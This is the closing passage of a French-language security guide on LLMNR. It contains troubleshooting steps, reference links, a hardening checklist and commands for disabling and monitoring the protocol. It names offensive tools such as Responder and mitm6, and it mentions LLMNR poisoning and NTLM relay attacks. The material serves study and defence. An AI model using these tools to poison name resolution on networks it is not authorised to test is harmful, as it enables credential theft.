   ```powershell
   ipconfig /flushdns
   ```
3. Redémarrer les adaptateurs réseau.

### 14.3 LLMNR et VPN

Certains clients VPN désactivent LLMNR pour éviter les fuites. Si une résolution de nom local échoue via VPN :

1. Vérifier les paramètres du client VPN.
2. Ajuster le suffixe DNS dans les propriétés de l'adaptateur.
3. Utiliser un FQDN au lieu d'un nom simple.

### 14.4 LLMNR sur Linux ne répond pas

```bash
# Vérifier systemd-resolved
systemctl status systemd-resolved

# Vérifier la configuration
resolvectl status

# Redémarrer
sudo systemctl restart systemd-resolved
```

---

## 15. Ressources, liens et livres

### 15.1 RFC et standards officiels

| Document | Lien | Description |
|----------|------|-------------|
| RFC 4795 | https://tools.ietf.org/html/rfc4795 | Spécification LLMNR |
| RFC 1035 | https://tools.ietf.org/html/rfc1035 | Format des messages DNS |
| RFC 6762 | https://tools.ietf.org/html/rfc6762 | Multicast DNS (mDNS) |
| RFC 6763 | https://tools.ietf.org/html/rfc6763 | DNS Service Discovery |

### 15.2 Documentation Microsoft

- https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd197552(v=ws.10)
- https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/llmnr-protocol

### 15.3 Outils de sécurité

- Responder : https://github.com/lgandx/Responder
- Inveigh : https://github.com/Kevin-Robertson/Inveigh
- mitm6 : https://github.com/fox-it/mitm6
- Impacket : https://github.com/SecureAuthCorp/impacket

### 15.4 Articles et tutoriels

- https://www.bleepingcomputer.com/news/security/what-is-llmnr-and-why-you-should-disable-it/
- https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/
- https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution

### 15.5 Livres recommandés

| Titre | Auteur(s) | Pourquoi le lire |
|-------|-----------|------------------|
| *Network Security Assessment* | Chris McNab | Méthodologie de test réseau incluant LLMNR. |
| *The Hacker Playbook 3* | Peter Kim | Scénarios d'attaques internes et relais NTLM. |
| *Active Directory Security* | Sean Metcalf | Durcissement Windows et protocoles d'annuaire. |
| *Wireshark Network Analysis* | Laura Chappell | Analyse de paquets LLMNR et DNS. |
| *TCP/IP Illustrated, Volume 1* | Kevin R. Fall, Richard Stevens | Fondamentaux des protocoles réseau. |

### 15.6 Chaînes et communautés

- **HACKERS_TCHAD** — Communauté cybersecurité Tchad.
- **Red Team Ops** — Apprentissage des attaques LLMNR/NBT-NS.
- **SANS SEC504 / SEC560** — Formations sur les tests d'intrusion.

---

## 16. Licence et avertissement

Ce document est fourni à des fins **éducatives et professionnelles légitimes**.

> **Avertissement :** Les techniques d'attaque décrites (LLMNR poisoning, Responder, relais NTLM) doivent être utilisées uniquement sur des systèmes que vous êtes autorisé à tester. Toute utilisation illégale est strictement interdite et relève de la seule responsabilité de l'utilisateur.

**Auteur :** `HACKERS_TCHAD`  
**Licence :** CC BY-SA 4.0 — partage autorisé avec attribution.

---

## Annexes

### Annexe A — Glossaire

| Terme | Définition |
|-------|------------|
| **Broadcast** | Envoi d'un paquet à tous les hôtes du réseau local. |
| **Multicast** | Envoi d'un paquet à un groupe d'hôtes intéressés. |
| **Unicast** | Communication un-à-un entre deux hôtes. |
| **NXDOMAIN** | Réponse DNS indiquant qu'un nom n'existe pas. |
| **FQDN** | Fully Qualified Domain Name, ex : `serveur.domaine.local`. |
| **Single-label** | Nom sans point, ex : `SERVEUR`. |
| **mDNS** | Multicast DNS, protocole concurrent de LLMNR. |
| **NetBIOS-NS** | NetBIOS Name Service, ancien protocole Windows. |
| **NTLM** | Protocole d'authentification Windows. |
| **Responder** | Outil d'empoisonnement de protocoles de découverte. |

### Annexe B — Liste des ports mentionnés

| Port | Protocole | Usage |
|------|-----------|-------|
| 53/udp | DNS | Résolution de noms classique |
| 137/udp | NetBIOS-NS | Résolution de noms NetBIOS |
| 5353/udp | mDNS | Multicast DNS |
| 5355/udp | LLMNR | Link-Local Multicast Name Resolution |
| 5355/tcp | LLMNR | Réponses tronquées LLMNR |
| 445/tcp | SMB | Partage de fichiers Windows |

### Annexe C — Fichier hosts Windows

Chemin :

```
C:\Windows\System32\drivers\etc\hosts
```

Exemple :

```
192.168.1.20    BOB-PC
192.168.1.42    PARTAGE
```

### Annexe D — Checklist de durcissement

- [ ] Désactiver LLMNR via GPO sur tous les postes Windows.
- [ ] Désactiver NetBIOS-NS sur les adaptateurs réseau.
- [ ] Activer SMB Signing sur serveurs et postes.
- [ ] Déployer un DNS local pour tous les noms d'hôtes.
- [ ] Segmenter le réseau en VLANs.
- [ ] Surveiller le trafic multicast sur 224.0.0.252 et FF02::1:3.
- [ ] Auditer régulièrement les stratégies de groupe.
- [ ] Former les équipes aux risques des protocoles de découverte.

### Annexe E — Commandes rapides

```powershell
# Vérifier l'état LLMNR
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient -Name EnableMulticast

# Désactiver LLMNR
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f

# Activer LLMNR
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 1 /f

# Vider le cache DNS
ipconfig /flushdns

# Mettre à jour les GPO
gpupdate /force
```

```bash
# Linux — désactiver LLMNR
sudo sed -i 's/#LLMNR=yes/LLMNR=no/' /etc/systemd/resolved.conf
sudo systemctl restart systemd-resolved
resolvectl status

# Capturer LLMNR
sudo tcpdump -i eth0 -nn -s0 -v udp port 5355
```

---

## Conclusion

LLMNR est un protocole pratique pour la résolution de noms en environnement sans DNS, mais il constitue une surface d'attaque importante dans les réseaux Windows. Comprendre son fonctionnement, savoir le configurer et le désactiver, ainsi que maîtriser les outils d'audit comme Responder, sont des compétences essentielles pour tout professionnel de la cybersécurité.

> **Message de HACKERS_TCHAD :** Apprenez, testez en labo, et sécurisez vos réseaux. La connaissance est une arme — utilisez-la de manière éthique.

---

*Fin du document.*
